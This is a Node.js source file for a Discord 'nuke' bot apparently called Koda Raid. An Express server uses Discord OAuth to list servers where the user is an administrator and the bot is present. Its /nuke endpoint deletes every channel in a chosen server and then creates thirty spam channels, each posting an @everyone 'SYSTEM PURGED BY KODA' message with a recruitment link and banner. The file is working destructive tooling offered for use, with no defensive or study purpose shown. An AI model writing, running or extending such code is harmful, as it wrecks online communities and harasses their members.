const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const CLIENT_ID = '1469577414022795346'; 
const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
const REDIRECT_URI = 'https://koda-raid.onrender.com/auth/callback';

// Login
app.get('/login', (req, res) => {
    const url = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds`;
    res.redirect(url);
});

// Callback
app.get('/auth/callback', async (req, res) => {
    const { code } = req.query;
    try {
        const response = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI,
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        res.redirect(`https://koda-raid.vercel.app/?token=${response.data.access_token}`);
    } catch (err) {
        res.status(500).send("Login Error");
    }
});

// API Servers
app.get('/api/servers', async (req, res) => {
    const token = req.headers.authorization;
    try {
        const userGuilds = await axios.get('https://discord.com/api/users/@me/guilds', {
            headers: { Authorization: token }
        });
        const botGuildIds = client.guilds.cache.map(g => g.id);
        const mutual = userGuilds.data.filter(g => (parseInt(g.permissions) & 0x8) === 0x8 && botGuildIds.includes(g.id));
        res.json(mutual);
    } catch (e) { res.status(500).send("Error fetching servers"); }
});

// NUKE + BANNER + MENSAJE EN INGLÉS
app.get('/nuke', async (req, res) => {
    const { guildId, name } = req.query;
    const guild = client.guilds.cache.get(guildId);
    if (!guild) return res.status(404).send("Bot not found in server");

    const channelName = name || 'koda-raid'; 

    try {
        const channels = await guild.channels.fetch();
        // 1. Borrar Canales
        for (const c of channels.values()) await c.delete().catch(() => {});
        
        // 2. Crear Canales + Enviar Banner
        for (let i = 0; i < 30; i++) {
            setTimeout(() => {
                guild.channels.create({ name: channelName, type: 0 })
                    .then(async channel => {
                        // AQUÍ SE ENVÍA EL BANNER Y EL TEXTO EN INGLÉS
                        await channel.send({
                            content: "@everyone **SYSTEM PURGED BY KODA** ☠️\nJoin the revolution: https://koda-raid.vercel.app",
                            files: ["https://koda-raid.vercel.app/banner.png"] // Asegúrate que banner.png esté en tu GitHub
                        }).catch(() => {});
                    })
                    .catch(() => {});
            }, i * 350);
        }
        res.send("Raid initiated");
    } catch (e) { res.status(500).send("Failed"); }
});

client.login(process.env.DISCORD_TOKEN);
app.listen(process.env.PORT || 3000);